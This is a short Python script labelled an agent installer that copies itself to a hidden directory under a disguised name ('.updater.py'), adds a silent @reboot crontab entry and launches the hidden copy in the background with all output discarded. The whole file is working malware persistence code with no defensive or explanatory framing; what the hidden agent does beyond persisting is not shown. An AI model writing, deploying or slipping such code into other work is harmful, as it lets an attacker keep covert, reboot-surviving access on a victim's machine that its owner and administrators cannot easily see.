# agent.py (Installer version)
import os
import subprocess
import sys

HIDDEN_DIR = os.path.expanduser("~/.config/.system")
HIDDEN_SCRIPT = os.path.join(HIDDEN_DIR, ".updater.py")

def install_persistent_agent():
    os.makedirs(HIDDEN_DIR, exist_ok=True)

    # Copy this script to the hidden location
    if not os.path.exists(HIDDEN_SCRIPT):
        with open(sys.argv[0], "r") as src, open(HIDDEN_SCRIPT, "w") as dst:
            dst.write(src.read())

    # Add to crontab
    cron_job = f"@reboot nohup python3 {HIDDEN_SCRIPT} &>/dev/null &"
    current_cron = subprocess.getoutput("crontab -l") if subprocess.call("crontab -l", shell=True) == 0 else ""
    if cron_job not in current_cron:
        new_cron = current_cron + f"\n{cron_job}\n"
        subprocess.run(f'echo "{new_cron}" | crontab -', shell=True)
        print("[+] Added to crontab.")

    # Launch hidden agent in background
    subprocess.Popen(f"nohup python3 {HIDDEN_SCRIPT} &>/dev/null &", shell=True)
    print("[+] Hidden agent started in background. Exiting installer.")
    sys.exit(0)

if __name__ == "__main__":
    install_persistent_agent()
